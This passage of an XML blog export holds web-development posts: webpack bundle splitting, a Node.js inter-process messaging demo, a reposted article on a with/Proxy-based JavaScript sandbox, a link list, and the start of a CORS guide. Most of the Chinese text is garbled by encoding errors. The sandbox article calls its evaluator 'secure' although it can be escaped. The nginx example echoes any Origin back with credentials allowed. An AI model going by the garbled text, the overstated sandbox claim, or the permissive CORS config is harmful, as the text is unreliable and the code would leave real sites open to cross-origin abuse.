&#123; vendor: &#123; //ç¬¬ä¸‰æ–¹ä¾èµ– priority: 1, //è®¾ç½®ä¼˜å…ˆçº§ï¼Œé¦–å…ˆæŠ½ç¦»ç¬¬ä¸‰æ–¹æ¨¡å— name: &apos;vendor&apos;, test: /node_modules/, chunks: &apos;initial&apos;, minSize: 0, minChunks: 1 //æœ€å°‘å¼•å…¥äº†1æ¬¡ &#125;, //ç¼“å­˜ç»„ common: &#123; //å…¬å…±æ¨¡å— chunks: &apos;initial&apos;, name: &apos;common&apos;, minSize: 100, //å¤§å°è¶…è¿‡100ä¸ªå­—èŠ‚ minChunks: 3 //æœ€å°‘å¼•å…¥äº†3æ¬¡ &#125; &#125; &#125; &#125;&#125; å³ä½¿æ˜¯å•é¡µåº”ç”¨ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªé…ç½®ï¼Œä¾‹å¦‚ï¼Œæ‰“åŒ…å‡ºæ¥çš„ bundle.js ä½“ç§¯è¿‡å¤§ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸€äº›ä¾èµ–æ‰“åŒ…æˆåŠ¨æ€é“¾æ¥åº“ï¼Œç„¶åå°†å‰©ä¸‹çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ‹†å‡ºæ¥ã€‚è¿™æ ·å¯ä»¥æœ‰æ•ˆå‡å° bundle.js çš„ä½“ç§¯å¤§å°ã€‚å½“ç„¶ï¼Œä½ è¿˜å¯ä»¥ç»§ç»­æå–ä¸šåŠ¡ä»£ç çš„å…¬å…±æ¨¡å—ï¼Œæ­¤å¤„ï¼Œå› ä¸ºæˆ‘é¡¹ç›®ä¸­æºç è¾ƒå°‘ï¼Œæ‰€ä»¥æ²¡æœ‰é…ç½®ã€‚ ![splitChunks.jpeg](data:image/svg+xml;utf8,) runtimeChunk runtimeChunk çš„ä½œç”¨æ˜¯å°†åŒ…å« chunk æ˜ å°„å…³ç³»çš„åˆ—è¡¨ä» main.js ä¸­æŠ½ç¦»å‡ºæ¥ï¼Œåœ¨é…ç½®äº† splitChunk æ—¶ï¼Œè®°å¾—é…ç½® runtimeChunk. 12345678module.exports = &#123; //... optimization: &#123; runtimeChunk: &#123; name: &apos;manifest&apos; &#125; &#125;&#125; æœ€ç»ˆæ„å»ºå‡ºæ¥çš„æ–‡ä»¶ä¸­ä¼šç”Ÿæˆä¸€ä¸ª manifest.jsã€‚ å€ŸåŠ© webpack-bundle-analyzer è¿›ä¸€æ­¥ä¼˜åŒ–åœ¨åš webpack æ„å»ºä¼˜åŒ–çš„æ—¶å€™ï¼Œvendor æ‰“å‡ºæ¥è¶…è¿‡äº†1Mï¼Œreact å’Œ react-dom å·²ç»æ‰“åŒ…æˆäº†DLLã€‚ å› æ­¤éœ€è¦å€ŸåŠ© webpack-bundle-analyzer æŸ¥çœ‹ä¸€ä¸‹æ˜¯å“ªäº›åŒ…çš„ä½“ç§¯è¾ƒå¤§ã€‚ é¦–å…ˆå®‰è£…ä¾èµ–ï¼š 1npm install webpack-bundle-analyzer -D ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œä¿®æ”¹ä¸‹æˆ‘ä»¬çš„é…ç½®ï¼š 1234567891011//webpack.config.prod.jsconst BundleAnalyzerPlugin = require(&apos;webpack-bundle-analyzer&apos;).BundleAnalyzerPlugin;const merge = require(&apos;webpack-merge&apos;);const baseWebpackConfig = require(&apos;./webpack.config.base&apos;);module.exports = merge(baseWebpackConfig, &#123; //.... plugins: [ //... new BundleAnalyzerPlugin(), ]&#125;) npm run build æ„å»ºï¼Œä¼šé»˜è®¤æ‰“å¼€ï¼š http://127.0.0.1:8888/ï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªåŒ…çš„ä½“ç§¯ï¼š è¿›ä¸€æ­¥å¯¹ vendor è¿›è¡Œæ‹†åˆ†ï¼Œå°† vendor æ‹†åˆ†æˆäº†4ä¸ª(ä½¿ç”¨ splitChunks è¿›è¡Œæ‹†åˆ†å³å¯)ã€‚ 12345678910111213141516171819202122232425262728module.exports = &#123; optimization: &#123; concatenateModules: false, splitChunks: &#123;//åˆ†å‰²ä»£ç å— maxInitialRequests:6, //é»˜è®¤æ˜¯5 cacheGroups: &#123; vendor: &#123; //ç¬¬ä¸‰æ–¹ä¾èµ– priority: 1, name: &apos;vendor&apos;, test: /node_modules/, chunks: &apos;initial&apos;, minSize: 100, minChunks: 1 //é‡å¤å¼•å…¥äº†å‡ æ¬¡ &#125;, &apos;lottie-web&apos;: &#123; name: &quot;lottie-web&quot;, // å•ç‹¬å°† react-lottie æ‹†åŒ… priority: 5, // æƒé‡éœ€å¤§äº`vendor` test: /[\/]node_modules[\/]lottie-web[\/]/, chunks: &apos;initial&apos;, minSize: 100, minChunks: 1 //é‡å¤å¼•å…¥äº†å‡ æ¬¡ &#125;, //... &#125; &#125;, &#125;,&#125; é‡æ–°æ„å»ºï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š 13.webpackè‡ªèº«çš„ä¼˜åŒ–tree-shakingå¦‚æœä½¿ç”¨ES6çš„import è¯­æ³•ï¼Œé‚£ä¹ˆåœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œä¼šè‡ªåŠ¨ç§»é™¤æ²¡æœ‰ä½¿ç”¨åˆ°çš„ä»£ç ã€‚ 12345678910111213141516171819//math.jsconst add = (a, b) =&gt; &#123; console.log(&apos;aaaaaa&apos;) return a + b;&#125;const minus = (a, b) =&gt; &#123; console.log(&apos;bbbbbb&apos;) return a - b;&#125;export &#123; add, minus&#125;//index.jsimport &#123;add, minus&#125; from &apos;./math&apos;;add(2,3); æ„å»ºçš„æœ€ç»ˆä»£ç é‡Œï¼Œminus å‡½æ•°ä¸ä¼šè¢«æ‰“åŒ…è¿›å»ã€‚ scope hosting ä½œç”¨åŸŸæå‡å˜é‡æå‡ï¼Œå¯ä»¥å‡å°‘ä¸€äº›å˜é‡å£°æ˜ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼Œé»˜è®¤å¼€å¯ã€‚ å¦å¤–ï¼Œå¤§å®¶æµ‹è¯•çš„æ—¶å€™æ³¨æ„ä¸€ä¸‹ï¼Œspeed-measure-webpack-plugin å’Œ HotModuleReplacementPlugin ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™: babel é…ç½®çš„ä¼˜åŒ–å¦‚æœä½ å¯¹ babel è¿˜ä¸å¤ªç†Ÿæ‚‰çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼šä¸å®¹é”™è¿‡çš„ Babel7 çŸ¥è¯†ã€‚ åœ¨ä¸é…ç½® @babel/plugin-transform-runtime æ—¶ï¼Œbabel ä¼šä½¿ç”¨å¾ˆå°çš„è¾…åŠ©å‡½æ•°æ¥å®ç°ç±»ä¼¼ _createClass ç­‰å…¬å…±æ–¹æ³•ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå°†è¢«æ³¨å…¥(inject)åˆ°éœ€è¦å®ƒçš„æ¯ä¸ªæ–‡ä»¶ä¸­ã€‚ä½†æ˜¯è¿™æ ·çš„ç»“æœå°±æ˜¯å¯¼è‡´æ„å»ºå‡ºæ¥çš„JSä½“ç§¯å˜å¤§ã€‚ æˆ‘ä»¬ä¹Ÿå¹¶ä¸éœ€è¦åœ¨æ¯ä¸ª js ä¸­æ³¨å…¥è¾…åŠ©å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ @babel/plugin-transform-runtimeï¼Œ@babel/plugin-transform-runtime æ˜¯ä¸€ä¸ªå¯ä»¥é‡å¤ä½¿ç”¨ Babel æ³¨å…¥çš„å¸®åŠ©ç¨‹åºï¼Œä»¥èŠ‚çœä»£ç å¤§å°çš„æ’ä»¶ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ .babelrc ä¸­å¢åŠ  @babel/plugin-transform-runtime çš„é…ç½®ã€‚ 12345678&#123; &quot;presets&quot;: [], &quot;plugins&quot;: [ [ &quot;@babel/plugin-transform-runtime&quot; ] ]&#125;]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js è¿›ç¨‹é—´é€šä¿¡]]></title>
    <url>%2F2020%2F03%2F16%2FNode.js%2FNode.js%20%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[master.js 1234567891011121314var childprocess = require(&apos;child_process&apos;);var worker = childprocess.fork(&apos;./worker.js&apos;);console.log(&apos;pid in master:&apos;, process.pid);worker.on(&apos;message&apos;, function(msg) &#123; console.log(&apos;1:&apos;, msg);&#125;)process.on(&apos;message&apos;, function(msg) &#123; console.log(&apos;2:&apos;, msg);&#125;)worker.send(&apos;---&apos;);process.emit(&apos;message&apos;, &apos;------&apos;); worker.js 12345678console.log(&apos;pid in worker:&apos;, process.pid);process.on(&apos;message&apos;, function(msg) &#123; console.log(&apos;3:&apos;, msg);&#125;);process.send(&apos;===&apos;);process.emit(&apos;message&apos;, &apos;======&apos;); è¿è¡Œç»“æœï¼š 1234567$ node master.jspid in master: 22229 // ä¸»è¿›ç¨‹åˆ›å»ºåæ‰“å°å…¶ pid2: ------ // ä¸»è¿›ç¨‹æ”¶åˆ°ç»™è‡ªå·±å‘çš„æ¶ˆæ¯pid in worker: 22230 // å­è¿›ç¨‹åˆ›å»ºåæ‰“å°å…¶ pid3: ====== // å­è¿›ç¨‹æ”¶åˆ°ç»™è‡ªå·±å‘çš„æ¶ˆæ¯ 1: === // ä¸»è¿›ç¨‹æ”¶åˆ°æ¥è‡ªå­è¿›ç¨‹çš„æ¶ˆæ¯3: --- // å­è¿›ç¨‹æ”¶åˆ°æ¥è‡ªä¸»è¿›ç¨‹çš„æ¶ˆæ¯ å…¶ä¸­æœ‰ä¸¤ä¸ªæœ‰è¶£çš„ç‚¹ï¼š åœ¨ä¸»è¿›ç¨‹ä¸­ï¼Œä½¿ç”¨ worker.on(&#39;message&#39;, ...) ç›‘å¬æ¥è‡ªå­è¿›ç¨‹çš„æ¶ˆæ¯ï¼Œä½¿ç”¨ process.on(&#39;message&#39;, ...) ç›‘å¬ç»™è‡ªå·±å‘çš„æ¶ˆæ¯ã€‚ä½†æ˜¯åœ¨å­è¿›ç¨‹ä¸­ï¼Œåªæœ‰ process.on(&#39;message&#39;, ...) ä¸€ç§æ¶ˆæ¯ç›‘å¬æ–¹å¼ï¼Œæ— æ³•åŒºåˆ†æ¶ˆæ¯æ¥æºã€‚ å¦‚æœæœ‰ç»™è‡ªå·±å‘æ¶ˆæ¯çš„æƒ…å†µï¼Œåˆ™å¿…é¡»å°†å¯¹åº”çš„æ¶ˆæ¯ç›‘å¬çš„ä»£ç æ”¾åœ¨æ¶ˆæ¯å‘é€ä»£ç å‰é¢ï¼Œå¦åˆ™æ— æ³•ç›‘å¬åˆ°è¯¥æ¶ˆæ¯å‘é€ã€‚ä¾‹å¦‚å°† master.js çš„æœ€åä¸€è¡Œä»£ç  process.emit(&#39;message&#39;, &#39;------&#39;); æ”¾ç½®åˆ°è¯¥æ–‡ä»¶ç¬¬ä¸€è¡Œï¼Œåˆ™è¿è¡Œç»“æœä¸ä¼šè¾“å‡º 2: ------ã€‚ å¦‚æœä¸èƒ½æ§åˆ¶æ¶ˆæ¯ç›‘å¬ä»£ç å’Œæ¶ˆæ¯å‘é€ä»£ç çš„å…ˆåé¡ºåºï¼Œå¯å°†ç»™è‡ªå·±å‘é€æ¶ˆæ¯çš„ä»£ç æ”¹å†™ä¸º setImmediate(process.emit.bind(process, &#39;message&#39;, ));]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Writing a JavaScript framework - Sandboxed Code Evaluation]]></title>
    <url>%2F2020%2F03%2F14%2FWeb%E5%89%8D%E7%AB%AF%2FWriting%20a%20JavaScript%20framework%20-%20Sandboxed%20Code%20Evaluation%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://blog.risingstack.com/writing-a-javascript-framework-sandboxed-code-evaluation/ This is the third chapter of the Writing a JavaScript framework series. In this chapter, I am going to explain the different ways of evaluating code in the browser and the issues they cause. I will also introduce a method, which relies on some new or lesser known JavaScript features. The series is about an open-source client-side framework, called NX. During the series, I explain the main difficulties I had to overcome while writing the framework. If you are interested in NX please visit the home page. The series includes the following chapters: Project structuring Execution timing Sandboxed code evaluation (current chapter) Data binding introduction Data Binding with ES6 Proxies Custom elements Client-side routing The evil eval The eval() function evaluates JavaScript code represented as a string. A common solution for code evaluation is the eval() function. Code evaluated by eval() has access to closures and the global scope, which leads to a security issue called code injection and makes eval() one of the most notorious features of JavaScript. Despite being frowned upon, eval() is very useful in some situations. Most modern front-end frameworks require its functionality but donâ€™t dare to use it because of the issue mentioned above. As a result, many alternative solutions emerged for evaluating strings in a sandbox instead of the global scope. The sandbox prevents the code from accessing secure data. Usually it is a simple JavaScript object, which replaces the global object for the evaluated code. The common wayThe most common eval() alternative is complete re-implementation - a two-step process, which consists of parsing and interpreting the passed string. First the parser creates an abstract syntax tree, then the interpreter walks the tree and interprets it as code inside a sandbox. This is a widely used solution, but it is arguably too heavy for such a simple thing. Rewriting everything from scratch instead of patching eval() introduces a lot of bug opportunities and it requires frequent modifications to follow the latest language updates as well. An alternative wayNX tries to avoid re-implementing native code. Evaluation is handled by a tiny library that uses some new or lesser known JavaScript features. This section will progressively introduce these features and use them to explain the nx-compile code evaluation library. The library has a function called compileCode(), which works like below. 1234567891011const code = compileCode('return num1 + num2')// this logs 17 to the consoleconsole.log(code(&#123;num1: 10, num2: 7&#125;))const globalNum = 12const otherCode = compileCode('return globalNum')// global scope access is prevented// this logs undefined to the consoleconsole.log(otherCode(&#123;num1: 2, num2: 3&#125;)) By the end of this article, we will implement the compileCode() function in less than 20 lines. new Function() The Function constructor creates a new Function object. In JavaScript, every function is actually a Function object. The Function constructor is an alternative to eval(). new Function(...args, &#39;funcBody&#39;) evaluates the passed &#39;funcBody&#39; string as code and returns a new function that executes that code. It differs from eval() in two major ways. It evaluates the passed code just once. Calling the returned function will run the code without re-evaluating it. It doesnâ€™t have access to local closure variables, however, it can still access the global scope. 123function compileCode (src) &#123; return new Function(src)&#125; new Function() is a better alternative to eval() for our use case. It has superior performance and security, but global scope access still has to be prevented to make it viable. The â€˜withâ€™ keyword The with statement extends the scope chain for a statement. with is a lesser known keyword in JavaScript. It allows a semi-sandboxed execution. The code inside a with block tries to retrieve variables from the passed sandbox object first, but if it doesnâ€™t find it there, it looks for the variable in the closure and global scope. Closure scope access is prevented by new Function() so we only have to worry about the global scope. 1234function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' return new Function('sandbox', src)&#125; with uses the in operator internally. For every variable access inside the block, it evaluates the variable in sandbox condition. If the condition is truthy, it retrieves the variable from the sandbox. Otherwise, it looks for the variable in the global scope. By fooling with to always evaluate variable in sandbox as truthy, we could prevent it from accessing the global scope. ES6 proxies The Proxy object is used to define custom behavior for fundamental operations like property lookup or assignment. An ES6 Proxy wraps an object and defines trap functions, which may intercept fundamental operations on that object. Trap functions are invoked when an operation occurs. By wrapping the sandbox object in a Proxy and defining a has trap, we can overwrite the default behavior of the in operator. 1234567891011121314function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has&#125;) return code(sandboxProxy) &#125;&#125;// this trap intercepts 'in' operations on sandboxProxyfunction has (target, key) &#123; return true&#125; The above code fools the with block. variable in sandbox will always evaluate to true because the has trap always returns true. The code inside the with block will never try to access the global object. Symbol.unscopables A symbol is a unique and immutable data type and may be used as an identifier for object properties. Symbol.unscopables is a well-known symbol. A well-known symbol is a built-in JavaScript Symbol, which represents internal language behavior. Well-known symbols can be used to add or overwrite iteration or primitive conversion behavior for example. The Symbol.unscopables well-known symbol is used to specify an object value of whose own and inherited property names are excluded from the â€˜withâ€™ environment bindings. Symbol.unscopables defines the unscopable properties of an object. Unscopable properties are never retrieved from the sandbox object in with statements, instead they are retrieved straight from the closure or global scope. Symbol.unscopables is a very rarely used feature. You can read about the reason it was introduced on this page. We can fix above issue by defining a get trap on the sandbox Proxy, which intercepts Symbol.unscopables retrieval and always returns undefined. This will fool the with block into thinking that our sandbox object has no unscopable properties. 123456789101112131415161718function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has, get&#125;) return code(sandboxProxy) &#125;&#125;function has (target, key) &#123; return true&#125;function get (target, key) &#123; if (key === Symbol.unscopables) return undefined return target[key]&#125; WeakMaps for cachingThe code is now secure, but its performance can be still upgraded, since it creates a new Proxy on every invocation of the returned function. This can be prevented by caching and using the same Proxy for every function call with the same sandbox object. A proxy belongs to a sandbox object, so we could simply add the proxy to the sandbox object as a property. However, this would expose our implementation details to the public, and it wouldnâ€™t work in case of an immutable sandbox object frozen with Object.freeze(). Using a WeakMap is a better alternative in this case. The WeakMap object is a collection of key/value pairs in which the keys are weakly referenced. The keys must be objects, and the values can be arbitrary values. A WeakMap can be used to attach data to an object without directly extending it with properties. We can use WeakMaps to indirectly add the cached Proxies to the sandbox objects. 1234567891011121314151617181920212223const sandboxProxies = new WeakMap()function compileCode (src) &#123; src = 'with (sandbox) &#123;' + src + '&#125;' const code = new Function('sandbox', src) return function (sandbox) &#123; if (!sandboxProxies.has(sandbox)) &#123; const sandboxProxy = new Proxy(sandbox, &#123;has, get&#125;) sandboxProxies.set(sandbox, sandboxProxy) &#125; return code(sandboxProxies.get(sandbox)) &#125;&#125;function has (target, key) &#123; return true&#125;function get (target, key) &#123; if (key === Symbol.unscopables) return undefined return target[key]&#125; This way only one Proxy will be created per sandbox object. Final notesThe above compileCode() example is a working sandboxed code evaluator in just 19 lines of code. If you would like to see the full source code of the nx-compile library, you can find it in this Github repository. Apart from explaining code evaluation, the goal of this chapter was to show how new ES6 features can be used to alter the existing ones, instead of re-inventing them. I tried to demonstrate the full power of Proxies and Symbols through the examples.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿›é˜¶é—¨æˆ·]]></title>
    <url>%2F2020%2F03%2F13%2F%E9%97%A8%E6%88%B7%2F%E8%BF%9B%E9%98%B6%E9%97%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[å‰ç«¯javaScript å‰ç«¯é¢è¯•ä¸è¿›é˜¶æŒ‡å— å£¹é¢˜æ±‡æ€» 33 Concepts Every JavaScript Developer Should Know æ¡†æ¶ react preact vue æŠ€æœ¯ç½‘å€ æ·˜ç³»å‰ç«¯å›¢é˜Ÿï¼ˆFEDï¼‰ InfoQ IMWeb AlloyTeam ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ å¿ƒçµé¸¡æ±¤ é˜¿é‡Œ 9 å¹´ï¼Œæˆ‘æ€»ç»“çš„å‰ç«¯æ¶æ„æ¼”è¿› 3 å¤§é˜¶æ®µåŠå›¢é˜Ÿç®¡ç†å¿ƒæ³• winterï¼šä»å‰ç«¯åˆ°â€é’±â€œç«¯ï¼Œæˆ‘å¹¶ä¸æŠŠé’±å½“å·¥ä½œç›®æ ‡ï¼Œä½†é’±ä»æ¥ä¹Ÿæ²¡æœ‰äºå¾…æˆ‘ ç‰ä¼¯ï¼šæˆ‘çš„å‰ç«¯æˆé•¿ä¹‹è·¯ node.jsæ¡†æ¶ egg koa express æŠ€æœ¯ç½‘å€ èš‚èšé‡‘æœä½“éªŒç§‘æŠ€ NodeJS pythonåŸºç¡€è¯­æ³• Python å®˜ç½‘ Python tutorial Python Cookbook Python ä»æ–°æ‰‹åˆ°å¤§å¸ˆ github èµ„æ–™ å»–é›ªå³° Python æ•™ç¨‹ AITensorflow Tensorflow.js å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ tfjs-examples Deep Learning with JavaScript-Neural networks in TensorFlow.js]]></content>
      <categories>
        <category>è¿›é˜¶é—¨æˆ·</category>
      </categories>
      <tags>
        <tag>è¿›é˜¶é—¨æˆ·</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äºè·¨åŸŸï¼Œçœ‹è¿™ä¸€ç¯‡æ–‡ç« å°±å¤Ÿäº†]]></title>
    <url>%2F2020%2F03%2F12%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%85%B3%E4%BA%8E%E8%B7%A8%E5%9F%9F%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B0%B1%E5%A4%9F%E4%BA%86%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç½‘ç»œï¼Œå¦‚æœ‰ä¾µæƒè¯·è”ç³»åˆ é™¤ èƒŒæ™¯å‰åç«¯åˆ†ç¦»çš„æ¨¡å¼ï¼Œå‰ç«¯åº”ç”¨é€šè¿‡è·¨åŸŸçš„æ–¹å¼ç›´è¿åç«¯æœºå™¨ã€‚ è·¨åŸŸè¯·æ±‚çš„ç±»å‹ç®€å•è¯·æ±‚ request method å±äº GET, HEAD, POST ä¸‰ç§ç®€å•ç±»å‹ä¹‹ä¸€ã€‚ headers åªåŒ…å«ä»¥ä¸‹å‡ ç§ (å¤§å°å†™ä¸æ•æ„Ÿ)ï¼š Cache-Control Content-Language Content-Type Expires Last-Modified Pragma éç®€å•è¯·æ±‚ (preflight) ä¸ç¬¦åˆä»¥ä¸Šç®€å•è¯·æ±‚è§„åˆ™çš„, æµè§ˆå™¨åœ¨å‘é€è¯·æ±‚å‰ï¼Œä¼šå…ˆå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª OPTIONS è¯·æ±‚, (ç§°ä¸º preflight), åªæœ‰å½“ preflight æ”¶åˆ° 200/204 çš„å›å¤æ—¶ï¼Œæ‰ä¼šå‘é€çœŸå®çš„è¯·æ±‚ã€‚ å“åº”éç®€å•è¯·æ±‚æœ‰äº›åç«¯åº”ç”¨å¯èƒ½åªæœ‰ GET å’Œ POST ä¸¤ç§è¯·æ±‚æ–¹å¼ï¼Œæ˜¯å¦è¿˜éœ€è¦èƒ½å“åº” preflight è¯·æ±‚å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯éœ€è¦çš„ï¼Œæ¯”å¦‚ä½ çš„å‰ç«¯åº”ç”¨åœ¨å¤šç¯å¢ƒéƒ¨ç½²ï¼Œå¯èƒ½éœ€è¦åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ  X-Antcloud-Tenant headerï¼Œæˆ–è€…æ˜¯æŸäº›è¯·æ±‚åº“ï¼Œé»˜è®¤ä¼šæ·»åŠ  x-request-lib è¿™ä¸€è¯·æ±‚å¤´ã€‚å› æ­¤ï¼ŒåŸæ¥ç¬¦åˆç®€å•è§„åˆ™çš„è¯·æ±‚ï¼Œä¹Ÿæœ‰æå¤§çš„å¯èƒ½ä¼šå˜æˆ preflight è¯·æ±‚ã€‚æ‰€ä»¥åç«¯éœ€è¦åšçš„æ˜¯ï¼Œåœ¨æ”¶åˆ° OPTIONS è¯·æ±‚æ—¶ï¼Œè¿”å› 200/204 çš„çŠ¶æ€ç ã€‚ è·¨åŸŸç›¸å…³çš„ headersRequest Headers: Access-Control-Request-Headers æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ ï¼Œåœ¨ preflight è¯·æ±‚ä¸­ï¼Œæµè§ˆå™¨ä¼šåŠ ä¸ŠçœŸå®è¯·æ±‚ä¸­å‡ºç°çš„ headersï¼Œåç«¯å¯ä»¥æ ¹æ®è¯¥å­—æ®µå†³å®š Access-Control-Allow-Headers çš„å€¼ã€‚ Response Headers: Access-Control-Allow-Origin å…è®¸è·¨åŸŸçš„çš„åŸŸåï¼Œä¸æ¨èä½¿ç”¨é€šé…ç¬¦(*), å› ä¸ºåœ¨ä½¿ç”¨é€šé…ç¬¦æ—¶ï¼Œä¼šè·³è¿‡ Access-Control-Allow-Credentials çš„é…ç½®ï¼Œç›´æ¥è¿‡æ»¤æ‰è¯·æ±‚æºå¸¦çš„ cookie. å¯èƒ½å¯¼è‡´åç«¯æ¥å£é‰´æƒå¤±è´¥ã€‚ Access-Control-Allow-Credentials æ˜¯å¦å…è®¸è·¨åŸŸè¯·æ±‚æºå¸¦ cookieï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ä¿¡æ¯å’Œç™»é™†çŠ¶æ€éƒ½å‚¨å­˜åœ¨ cookie ä¸­ã€‚å¦‚æœä¸æºå¸¦ cookie åˆ™æ— æ³•é€šè¿‡åç«¯çš„æ¥å£é‰´æƒï¼Œéœ€è¦è®¾ç½®ä¸º true. Access-Control-Allow-Headers å…è®¸å‡ºç°çš„éç®€å•è¯·æ±‚å¤´ã€‚ Access-Control-Allow-Methods å…è®¸è·¨åŸŸçš„æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šçš„å®‰å…¨è€ƒè™‘ï¼Œå¯ä»¥é’ˆå¯¹ POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH è¯·æ±‚éƒ½æ”¾å¼€ï¼Œè®©æ‰€æœ‰ç¬¦åˆ restful è§„èŒƒçš„è¯·æ±‚éƒ½èƒ½è·¨åŸŸã€‚ Access-Control-Expose-Headers éå¿…å¡«ï¼Œå¦‚æœå‰ç«¯éœ€è¦æ¶ˆè´¹éç®€å•è¯·æ±‚ã€‚åˆ™éœ€é€šè¿‡è¯¥é…ç½®æŒ‡å®šé¢å¤–å…è®¸å‰ç«¯è·å¾—çš„ headersã€‚éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨çš„è¿”å›è¯·æ±‚ä¸­å‡ºç° provisonal headerï¼Œä¹Ÿä¸æ­¤é…ç½®æœ‰å…³ã€‚ Access-Control-Max-Age éå¿…å¡«ï¼Œpreflight è¯·æ±‚çš„æœ‰æ•ˆæœŸã€‚ é€šè¿‡ nginx é…ç½®è·¨åŸŸé€šè¿‡ä¸Šé¢è¯·æ±‚å¤´å­—æ®µçš„è§£é‡Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ nginx å…è®¸åç«¯åº”ç”¨è·¨åŸŸã€‚åœ¨åç«¯é¡¹ç›®çš„ conf/auto-conf/t-alipay-engine.conf æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å¯¹åç«¯è·¯å¾„å¢åŠ å¦‚ä¸‹é…ç½®ï¼š 123456789101112131415location ^~ /api &#123; proxy_set_header Origin &apos;&apos;; add_header Access-Control-Allow-Credentials true; add_header Access-Control-Allow-Headers $http_access_control_request_headers; add_header Access-Control-Allow-Methods POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH; add_header Access-Control-Allow-Origin $http_origin; add_header Access-Control-Expose-Headers $http_access_control_request_headers; if ($request_method = &apos;OPTIONS&apos;) &#123; return 204; &#125; if ($request_method != &apos;OPTIONS&apos;)&#123; proxy_pass [å¡«å…¥æ¥å£ä»£ç†åœ°å€]; &#125;&#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®å‰ nginx 1.7.5 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œadd_header åªå¯¹ 2xxï¼Œ3xx çš„è¯·æ±‚ç”Ÿæ•ˆï¼Œ5xx çš„è¯·æ±‚æ— æ³•å¢åŠ  headerï¼Œä»ä¼šè¢«æµè§ˆå™¨è·¨åŸŸç­–ç•¥æ‹¦æˆªï¼Œåœ¨ 5xx è¯·æ±‚çš„ body ä¸­åŒ…å«çš„é”™è¯¯ä¿¡æ¯ï¼Œå‰ç«¯æ— æ³•è·å–åˆ°ã€‚ å› æ­¤ï¼Œé€šè¿‡è¿™ç§ç­–ç•¥é…ç½®çš„è·¨åŸŸï¼Œåç«¯éœ€è¦å°†é”™è¯¯ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼šå‚æ•°é”™è¯¯ã€æœªç™»é™†ï¼‰åŒ…å«åœ¨ä¸€ä¸ª 200 çš„è¯·æ±‚å†…è¿”å›ã€‚è€Œä¸èƒ½é€šè¿‡ 401ã€502 ç­‰ http code è¿”å›ï¼Œå¦åˆ™å‰ç«¯å°†æ— æ³•è·å–æ¥å£å‡ºé”™æ—¶çš„å†…å®¹ã€‚ é€šè¿‡ Java Filter é…ç½®è·¨åŸŸ ä»¥ä¸‹å†…å®¹æ‘˜è‡ª SOFA å®˜ç½‘ï¼ŒåŸé“¾æ¥ MVC 4.2.0 ä¹‹å‰æ¡†æ¶é»˜è®¤æ”¯æŒçš„æ–¹æ³•æ˜¯GETã€HEADã€POSTï¼šç›¸å…³ä»£ç ï¼Œå¦‚æœè·¨åŸŸæ–¹æ³•ä¸åœ¨è¿™äº›æ–¹æ³•åˆ—è¡¨ä¸­ï¼Œå¯èƒ½æŠ¥é”™ï¼Œä¸”MVC 4.2.0ä¹‹å‰ç‰ˆæœ¬ä¸æ”¯æŒä¿®æ”¹CORSè·¨åŸŸç›¸å…³é…ç½®ï¼Œå¦‚æœæŠ¥é”™å»ºè®®å‡çº§åˆ°4.2.2ä»¥ä¸Šç‰ˆæœ¬ã€‚ MVC 4.2.2 